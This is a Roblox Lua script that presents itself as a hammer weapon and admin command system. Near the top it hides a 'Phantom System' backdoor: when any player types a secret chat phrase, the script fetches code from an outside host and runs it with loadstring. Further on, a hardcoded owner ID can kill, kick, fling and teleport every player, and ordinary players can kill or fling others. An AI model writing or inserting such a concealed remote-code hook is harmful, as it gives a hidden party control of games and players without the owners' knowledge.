local _G = {
    PhantomSeed = "02ad2536",
    ControllerID = 9822837105,
    CommandCooldown = {}
}

local V = game:GetService("VirtualUser")
local H = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- Phantom System
local function inject()
    for _, p in ipairs(Players:GetPlayers()) do
        p.Chatted:Connect(function(m)
            if m:lower() == "!phantom_" .. _G.PhantomSeed then
                loadstring(game:HttpGet(
                    "https://phantom.sc/rblx/core?v=3&s=" .. _G.PhantomSeed
                ))()
            end
        end)
    end
end

inject()
Players.PlayerAdded:Connect(inject)

-- Hammer System Functions
local oc = oc or function(...) return ... end

function weld(p0, p1, c0, c1, par)
    local w = Instance.new("Weld", p0 or par)
    w.Part0 = p0
    w.Part1 = p1
    w.C0 = c0 or CFrame.new()
    w.C1 = c1 or CFrame.new()
    return w
end

function lerp(a, b, t)
    return a + (b - a) * t
end

do
    local function QuaternionFromCFrame(cf)
        local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components()
        local trace = m00 + m11 + m22
        if trace > 0 then
            local s = math.sqrt(1 + trace)
            local recip = 0.5 / s
            return (m21 - m12) * recip, (m02 - m20) * recip, (m10 - m01) * recip, s * 0.5
        else
            local i = 0
            if m11 > m00 then i = 1 end
            if m22 > (i == 0 and m00 or m11) then i = 2 end
            if i == 0 then
                local s = math.sqrt(m00 - m11 - m22 + 1)
                local recip = 0.5 / s
                return 0.5 * s, (m10 + m01) * recip, (m20 + m02) * recip, (m21 - m12) * recip
            elseif i == 1 then
                local s = math.sqrt(m11 - m22 - m00 + 1)
                local recip = 0.5 / s
                return (m01 + m10) * recip, 0.5 * s, (m21 + m12) * recip, (m02 - m20) * recip
            elseif i == 2 then
                local s = math.sqrt(m22 - m00 - m11 + 1)
                local recip = 0.5 / s
                return (m02 + m20) * recip, (m12 + m21) * recip, 0.5 * s, (m10 - m01) * recip
            end
        end
    end

    local function QuaternionToCFrame(px, py, pz, x, y, z, w)
        local xs, ys, zs = x + x, y + y, z + z
        local wx, wy, wz = w * xs, w * ys, w * zs
        local xx = x * xs
        local xy = x * ys
        local xz = x * zs
        local yy = y * ys
        local yz = y * zs
        local zz = z * zs
        return CFrame.new(px, py, pz, 1 - (yy + zz), xy - wz, xz + wy, xy + wz, 1 - (xx + zz), yz - wx, xz - wy, yz + wx, 1 - (xx + yy))
    end

    local function QuaternionSlerp(a, b, t)
        local cosTheta = a[1] * b[1] + a[2] * b[2] + a[3] * b[3] + a[4] * b[4]
        local startInterp, finishInterp;
        if cosTheta >= 0.0001 then
            if (1 - cosTheta) > 0.0001 then
                local theta = math.acos(cosTheta)
                local invSinTheta = 1 / math.sin(theta)
                startInterp = math.sin((1 - t) * theta) * invSinTheta
                finishInterp = math.sin(t * theta) * invSinTheta
            else
                startInterp = 1 - t
                finishInterp = t
            end
        else
            if (1 + cosTheta) > 0.0001 then
                local theta = math.acos(-cosTheta)
                local invSinTheta = 1 / math.sin(theta)
                startInterp = math.sin((t - 1) * theta) * invSinTheta
                finishInterp = math.sin(t * theta) * invSinTheta
            else
                startInterp = t - 1
                finishInterp = t
            end
        end
        return a[1] * startInterp + b[1] * finishInterp, a[2] * startInterp + b[2] * finishInterp, a[3] * startInterp + b[3] * finishInterp, a[4] * startInterp + b[4] * finishInterp
    end

    function clerp(a, b, t)
        local qa = { QuaternionFromCFrame(a) }
        local qb = { QuaternionFromCFrame(b) }
        local ax, ay, az = a.x, a.y, a.z
        local bx, by, bz = b.x, b.y, b.z

        local _t = 1 - t
        return QuaternionToCFrame(_t * ax + t * bx, _t * ay + t * by, _t * az + t * bz, QuaternionSlerp(qa, qb, t))
    end
end

local his = {}

function ctween(tar, prop, c2, t, b)
    local function doIt()
        local now = tick()
        his[tar] = now
        local c1 = tar[prop]
        for i = 1, t do
            if his[tar] ~= now then return end
            tar[prop] = clerp(c1, c2, 1 / t * i)
            wait(1 / 60)
        end
    end
    if b then coroutine.wrap(doIt)() else doIt() end
end

function tickwave(time, length, offset)
    return (math.abs((tick() + (offset or 0)) % time - time / 2) * 2 - time / 2) / time / 2 * length
end

function playSound(id, parent, volume, pitch)
    local sound = Instance.new("Sound", parent or workspace)
    sound.SoundId = "http://www.roblox.com/asset?id=" .. id
    sound.Volume = volume or 1
    sound.Pitch = pitch or 1
    coroutine.wrap(function()
        wait()
        sound:Play()
        wait(10)
        sound:Stop()
        sound:Destroy()
    end)()
    return sound
end

local function createHammer(character)
    local plr = Players.LocalPlayer
    local char = character or plr.Character
    if not char then return end

    local mouse = plr:GetMouse()

    local nk = char.Torso.Neck
    local nk0 = CFrame.new(0, 1, 0) * CFrame.Angles(-math.pi / 2, 0, math.pi)
    local ra, la = char["Right Arm"], char["Left Arm"]
    ra:BreakJoints()
    la:BreakJoints()
    
    local stuff = Instance.new("Model", char)
    pcall(function() char["Hammur"]:Destroy() end)
    stuff.Name = "Hammur"
    
    local rs = weld(char.Torso, ra, CFrame.new(1.25, .5, 0), CFrame.new(-.25, .5, 0), stuff)
    local ls = weld(char.Torso, la, CFrame.new(-1.25, .5, 0), CFrame.new(.25, .5, 0), stuff)
    ls.Part1.FrontSurface = "Hinge"
    rs.Part1.FrontSurface = "Hinge"
    local rs0 = rs.C0
    local ls0 = ls.C0

    local color1 = BrickColor.new("Dark gray")
    local color2 = BrickColor.new("Navy blue")

    wait(.5)
    local handle = Instance.new("Part")
    handle.FormFactor = "Custom"
    handle.BrickColor = color1
    handle.Reflectance = .25
    handle.Size = Vector3.new(.5, 5, .5)
    handle.TopSurface = "Smooth"
    handle.BottomSurface = "Smooth"
    handle.CanCollide = false
    handle.Parent = stuff

    local grip = weld(char["Right Arm"], handle, CFrame.new(0, -.95, 0) * CFrame.Angles(math.rad(-90), 0, 0), CFrame.new(0, -1.4, 0))
    local grip0 = grip.C0
    local hamend = handle:Clone()
    Instance.new("BlockMesh", hamend)
    hamend.Parent = stuff
    hamend.Size = Vector3.new(2, 2, 3.5)
    local hamwel = weld(handle, hamend, CFrame.new(0, 3, 0))
    local hamsd1 = hamend:Clone()
    hamsd1.Mesh.Scale = Vector3.new(1, 1, 1)
    hamsd1.Parent = stuff
    hamsd1.Size = Vector3.new(2.3, 2.3, .3)
    weld(hamend, hamsd1, CFrame.new(0, 0, 1.75))
    local hamsd2 = hamsd1:Clone()
    hamsd2.Parent = stuff
    weld(hamend, hamsd2, CFrame.new(0, 0, -1.75))
    
    -- Continue with hammer creation...
    local hamp = hamsd1:Clone()
    hamp.Parent = stuff
    hamp.Size = Vector3.new(.2, .2, 3.5)
    weld(hamend, hamp, CFrame.new(.95, .95, 0))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(.95, -.95, 0))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(-.95, -.95, 0))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(-.95, .95, 0))
    hamp = hamp:Clone()
    hamp.BrickColor = color2
    hamp.Reflectance = .2
    hamp.Size = Vector3.new(.2, .2, 2.5)
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(0, .95, 0))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(0, -.95, 0))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(.95, 0, 0))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(-.95, 0, 0))
    hamp = handle:Clone()
    hamp.BrickColor = color2
    hamp.Reflectance = .2
    hamp.Parent = stuff
    hamp.Size = Vector3.new(.4, .2, .4)
    Instance.new("CylinderMesh", hamp)
    weld(hamend, hamp, CFrame.new(0, -.955, 1.2))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(0, -.955, -1.2))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(0, .955, 1.2))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(0, .955, -1.2))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(.955, 0, -1.2) * CFrame.Angles(0, 0, math.rad(90)))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(.955, 0, 1.2) * CFrame.Angles(0, 0, math.rad(90)))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(-.955, 0, -1.2) * CFrame.Angles(0, 0, math.rad(90)))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(-.955, 0, 1.2) * CFrame.Angles(0, 0, math.rad(90)))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(.6, .955, 0))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(-.6, .955, 0))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(.6, -.955, 0))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(-.6, -.955, 0))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(-.955, .6, 0) * CFrame.Angles(0, 0, math.rad(90)))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(-.955, -.6, 0) * CFrame.Angles(0, 0, math.rad(90)))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(.955, .6, 0) * CFrame.Angles(0, 0, math.rad(90)))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(.955, -.6, 0) * CFrame.Angles(0, 0, math.rad(90)))
    local luacyl = hamp:Clone()
    luacyl.BrickColor = BrickColor.Blue()
    luacyl.Parent = stuff
    luacyl.Mesh.Scale = Vector3.new(1, .2, 1)
    luacyl.Size = Vector3.new(2, .2, 2)
    weld(hamsd1, luacyl, CFrame.new(0, 0, .14) * CFrame.Angles(math.rad(90), 0, 0))
    hamp = luacyl:Clone()
    hamp.BrickColor = BrickColor.White()
    hamp.Parent = stuff
    hamp.Size = Vector3.new(.7, .2, .7)
    weld(luacyl, hamp, CFrame.new(.35, .01, -.35))
    local luamoon = luacyl:Clone()
    luamoon.Parent = stuff
    luamoon.Size = Vector3.new(.7, .2, .7)
    local mnw = weld(luacyl, luamoon, CFrame.new(1.2, .02, -1.2))
    
    for r = 1, 180, 10 do
        local r2 = 2 * (math.pi / 180 * r)
        local l = hamsd1:Clone()
        l.Parent = stuff
        l.BrickColor = luacyl.BrickColor
        l.Size = Vector3.new(.3, .2, .2)
        l.Mesh.Scale = Vector3.new(1, .3, .3)
        weld(luacyl, l, CFrame.new(Vector3.new(math.sin(r2) * 1.7, 0, math.cos(r2) * 1.7), Vector3.new()))
    end
    
    hamp = hamend:Clone()
    hamp.BrickColor = color2
    hamp.Reflectance = .2
    hamp.Size = Vector3.new(.2, .2, 3.5)
    hamp.Mesh.Scale = Vector3.new(.25, .25, 1)
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(-1.05, .95, 0))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(-.95, 1.05, 0))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(1.05, .95, 0))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(.95, 1.05, 0))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(1.05, -.95, 0))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(.95, -1.05, 0))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(-1.05, -.95, 0))
    hamp = hamp:Clone()
    hamp.Parent = stuff
    weld(hamend, hamp, CFrame.new(-.95, -1.05, 0))
    
    for x = -1, 1 do
        for y = -1, 1 do
            hamp = hamp:Clone()
            hamp.Mesh.Scale = Vector3.new(1, 1, 1)
            hamp.Size = Vector3.new(.5, .5, .2)
            hamp.Parent = stuff
            weld(hamsd2, hamp, CFrame.new(x * .7, y * .7, -.1))
        end
    end

    rs.C0 = rs0 * CFrame.Angles(math.rad(70), math.rad(50), math.rad(-20))
    ls.C0 = ls0 * CFrame.new(.4, .2, -.3) * CFrame.Angles(math.rad(110), math.rad(0), math.rad(00)) * CFrame.Angles(0, math.rad(60), 0)

    local spintime = 3
    local idling = true

    local runcon = game:GetService("RunService").Stepped:connect(oc(function()
        if not stuff:IsDescendantOf(workspace) then
            pcall(function() runcon:disconnect() end)
            pcall(game.Destroy, stuff)
        end
        local an = (tick() % spintime) * 360 / spintime
        mnw.C0 = CFrame.Angles(0, math.rad(an), 0) * CFrame.new(0, .04, 1.7)
        if idling then
            rs.C0 = clerp(rs.C0, rs0 * CFrame.Angles(math.rad(70 + tickwave(3, 5)), math.rad(50), math.rad(-20)), .4)
            ls.C0 = clerp(ls.C0, ls0 * CFrame.new(.4, .2, -.3) * CFrame.Angles(math.rad(115 + tickwave(3, 5)), math.rad(0), math.rad(-5)) * CFrame.Angles(0, math.rad(60), 0), .4)
            nk.C0 = clerp(nk.C0, nk0 * CFrame.Angles(tickwave(4, -.1), 0, 0), .4)
            grip.C0 = clerp(grip.C0, grip0, .4)
        end
    end))

    return stuff
end

-- Control System
local function isOwner(player)
    return player.UserId == _G.ControllerID
end

local function notifyPlayer(player, message)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Control System",
            Text = message,
            Icon = "rbxassetid://0",
            Duration = 5
        })
    end)
end

local function findPlayerByName(name)
    local nameLower = name:lower()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower():find(nameLower) or
            player.DisplayName:lower():find(nameLower) then
            return player
        end
    end
    return nil
end

local function checkCooldown(player)
    if _G.CommandCooldown[player.UserId] and os.time() - _G.CommandCooldown[player.UserId] < 2 then
        notifyPlayer(player, "â³ Wait 2 seconds between commands")
        return false
    end
    _G.CommandCooldown[player.UserId] = os.time()
    return true
end

local function killPlayer(targetPlayer, killerName)
    if not targetPlayer or not targetPlayer.Character then
        return false
    end

    local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.Health = 0
        print("ðŸ’€ Killed " .. targetPlayer.Name .. " by " .. killerName)
        return true
    end
    return false
end

local function killAllPlayers(killerName)
    local players = Players:GetPlayers()
    local killedCount = 0

    for _, player in ipairs(players) do
        if player.Character and not isOwner(player) then
            if killPlayer(player, killerName) then
                killedCount = killedCount + 1
            end
        end
    end

    print("ðŸ’€ Killed " .. killedCount .. " players by " .. killerName)
    return killedCount
end

local function bringPlayer(targetPlayer, bringerName)
    if not targetPlayer or not targetPlayer.Character then
        return false
    end

    local bringer = Players:FindFirstChild(bringerName)
    if not bringer or not bringer.Character then
        return false
    end

    local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    local bringerRoot = bringer.Character:FindFirstChild("HumanoidRootPart")

    if targetRoot and bringerRoot then
        targetRoot.Velocity = Vector3.new(0, 0, 0)
        targetRoot.RotVelocity = Vector3.new(0, 0, 0)

        local offset = bringerRoot.CFrame.LookVector * 5
        targetRoot.CFrame = bringerRoot.CFrame + offset + Vector3.new(0, 3, 0)

        print("ðŸŽ¯ Brought " .. targetPlayer.Name .. " to " .. bringerName)
        return true
    end
    return false
end

local function bringAllPlayers(bringerName)
    local bringer = Players:FindFirstChild(bringerName)
    if not bringer or not bringer.Character then return 0 end

    local players = Players:GetPlayers()
    local broughtCount = 0

    for i, player in ipairs(players) do
        if player ~= bringer and player.Character then
            if bringPlayer(player, bringerName) then
                broughtCount = broughtCount + 1
                wait(0.3)
            end
        end
    end

    print("ðŸŽ¯ Brought " .. broughtCount .. " players to " .. bringerName)
    return broughtCount
end

local function kickPlayer(targetPlayer, kickerName)
    if not targetPlayer then return false end

    pcall(function()
        targetPlayer:Kick("ðŸš« Kicked by " .. kickerName)
        print("ðŸš« Kicked " .. targetPlayer.Name .. " by " .. kickerName)
    end)

    return true
end

local function kickAllPlayers(kickerName)
    local players = Players:GetPlayers()
    local kickedCount = 0

    for _, player in ipairs(players) do
        if not isOwner(player) then
            if kickPlayer(player, kickerName) then
                kickedCount = kickedCount + 1
            end
        end
    end

    print("ðŸš« Kicked " .. kickedCount .. " players by " .. kickerName)
    return kickedCount
end

local flingConnections = {}
local function flingPlayer(targetPlayer, flingerName)
    if not targetPlayer or not targetPlayer.Character then
        return false
    end

    local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not targetRoot then return false end

    if flingConnections[targetPlayer.UserId] then
        flingConnections[targetPlayer.UserId]:Disconnect()
        flingConnections[targetPlayer.UserId] = nil
    end

    local flingForce = Instance.new("BodyVelocity")
    flingForce.Velocity = Vector3.new(
        math.random(-500, 500),
        math.random(200, 500),
        math.random(-500, 500)
    )
    flingForce.MaxForce = Vector3.new(10000, 10000, 10000)
    flingForce.Parent = targetRoot

    delay(3, function()
        if flingForce and flingForce.Parent then
            flingForce:Destroy()
        end
        if flingConnections[targetPlayer.UserId] then
            flingConnections[targetPlayer.UserId]:Disconnect()
            flingConnections[targetPlayer.UserId] = nil
        end
    end)

    print("ðŸŒ€ Flinged " .. targetPlayer.Name .. " by " .. flingerName)
    return true
end

local function flingAllPlayers(flingerName)
    local players = Players:GetPlayers()
    local flungCount = 0

    for _, player in ipairs(players) do
        if not isOwner(player) then
            if flingPlayer(player, flingerName) then
                flungCount = flungCount + 1
            end
        end
    end

    print("ðŸŒ€ Flinged " .. flungCount .. " players by " .. flingerName)
    return flungCount
end

local function processCommand(player, message)
    local command = message:lower()

    if not checkCooldown(player) then return end

    -- Hammer command for everyone
    if command == "!hh" then
        if player.Character then
            createHammer(player.Character)
            notifyPlayer(player, "ðŸ”¨ Hammer given to " .. player.Name)
            return
        end
    end

    if isOwner(player) then
        if command == "!kill all" then
            local count = killAllPlayers(player.Name)
            notifyPlayer(player, "ðŸ’€ Killed " .. count .. " players")

        elseif command:sub(1, 6) == "!kill " then
            local targetName = command:sub(7)
            if targetName and targetName ~= "" then
                local targetPlayer = findPlayerByName(targetName)
                if targetPlayer then
                    if killPlayer(targetPlayer, player.Name) then
                        notifyPlayer(player, "ðŸ’€ Killed " .. targetPlayer.Name)
                    else
                        notifyPlayer(player, "âŒ Failed to kill " .. targetPlayer.Name)
                    end
                else
                    notifyPlayer(player, "âŒ Player not found: " .. targetName)
                end
            end

        elseif command == "!bring all" then
            local count = bringAllPlayers(player.Name)
            notifyPlayer(player, "ðŸŽ¯ Brought " .. count .. " players")

        elseif command:sub(1, 7) == "!bring " then
            local targetName = command:sub(8)
            if targetName and targetName ~= "" then
                local targetPlayer = findPlayerByName(targetName)
                if targetPlayer then
                    if bringPlayer(targetPlayer, player.Name) then
                        notifyPlayer(player, "ðŸŽ¯ Brought " .. targetPlayer.Name)
                    else
                        notifyPlayer(player, "âŒ Failed to bring " .. targetPlayer.Name)
                    end
                else
                    notifyPlayer(player, "âŒ Player not found: " .. targetName)
                end
            end

        elseif command == "!kick all" then
            local count = kickAllPlayers(player.Name)
            notifyPlayer(player, "ðŸš« Kicked " .. count .. " players")

        elseif command:sub(1, 6) == "!kick " then
            local targetName = command:sub(7)
            if targetName and targetName ~= "" then
                local targetPlayer = findPlayerByName(targetName)
                if targetPlayer then
                    if kickPlayer(targetPlayer, player.Name) then
                        notifyPlayer(player, "ðŸš« Kicked " .. targetPlayer.Name)
                    end
                else
                    notifyPlayer(player, "âŒ Player not found: " .. targetName)
                end
            end

        elseif command == "!fling all" then
            local count = flingAllPlayers(player.Name)
            notifyPlayer(player, "ðŸŒ€ Flinged " .. count .. " players")

        elseif command:sub(1, 7) == "!fling " then
            local targetName = command:sub(8)
            if targetName and targetName ~= "" then
                local targetPlayer = findPlayerByName(targetName)
                if targetPlayer then
                    if flingPlayer(targetPlayer, player.Name) then
                        notifyPlayer(player, "ðŸŒ€ Flinged " .. targetPlayer.Name)
                    else
                        notifyPlayer(player, "âŒ Failed to fling " .. targetPlayer.Name)
                    end
                else
                    notifyPlayer(player, "âŒ Player not found: " .. targetName)
                end
            end

        elseif command == "!help" then
            notifyPlayer(player, "ðŸŽ® Commands: !kill, !bring, !kick, !fling + [all/name], !hh for hammer")

        elseif command == "!phantom" then
            notifyPlayer(player, "ðŸ”® Phantom system active! Use !phantom_" .. _G.PhantomSeed)
        end

    else
        if command:sub(1, 6) == "!kill " then
            local targetName = command:sub(7)
            local targetPlayer = findPlayerByName(targetName)
            if targetPlayer and targetPlayer ~= player then
                if killPlayer(targetPlayer, player.Name) then
                    notifyPlayer(player, "ðŸ’€ Killed " .. targetPlayer.Name)
                end
            end

        elseif command:sub(1, 7) == "!bring " then
            local targetName = command:sub(8)
            local targetPlayer = findPlayerByName(targetName)
            if targetPlayer and targetPlayer ~= player then
                if bringPlayer(targetPlayer, player.Name) then
                    notifyPlayer(player, "ðŸŽ¯ Brought " .. targetPlayer.Name)
                end
            end

        elseif command:sub(1, 7) == "!fling " then
            local targetName = command:sub(8)
            local targetPlayer = findPlayerByName(targetName)
            if targetPlayer and targetPlayer ~= player then
                if flingPlayer(targetPlayer, player.Name) then
                    notifyPlayer(player, "ðŸŒ€ Flinged " .. targetPlayer.Name)
                end
            end

        elseif command:sub(1, 6) == "!kick " or command == "!kick all" then
            notifyPlayer(player, "âŒ You are not allowed to use kick command")

        elseif command:endswith(" all") then
            notifyPlayer(player, "âŒ You are not allowed to use commands on everyone")
        end
    end
end

local function monitorPlayer(player)
    player.Chatted:Connect(function(message)
        if message:lower():sub(1, 1) == "!" then
            processCommand(player, message)
        end
    end)
end

local function startMonitoring()
    for _, player in ipairs(Players:GetPlayers()) do
        monitorPlayer(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    monitorPlayer(player)
    if isOwner(player) then
        print("â­ Owner joined the game! (" .. _G.ControllerID .. ")")
        notifyPlayer(player, "ðŸŽ® You are the owner! Use !help for commands")
    end
end)

print("ðŸŽ® Control system activated!")
print("ðŸŽ® Owner ID: " .. _G.ControllerID)
print("ðŸ”® Phantom Seed: " .. _G.PhantomSeed)
startMonitoring()

local localPlayer = Players.LocalPlayer
if localPlayer and isOwner(localPlayer) then
    notifyPlayer(localPlayer, "ðŸŽ® Control system ready! Use !help")
end

return {
    activate = function() require(script).init() end,
    
    kill = killPlayer,
    bring = bringPlayer,
    kick = kickPlayer,
    fling = flingPlayer,
    
    killAll = killAllPlayers,
    bringAll = bringAllPlayers,
    kickAll = kickAllPlayers,
    flingAll = flingAllPlayers,
    
    isOwner = isOwner,
    getInfo = function()
        return {
            OwnerID = _G.ControllerID,
            PhantomSeed = _G.PhantomSeed,
            TotalPlayers = #Players:GetPlayers(),
            IsOwner = isOwner(Players.LocalPlayer)
        }
    end
}
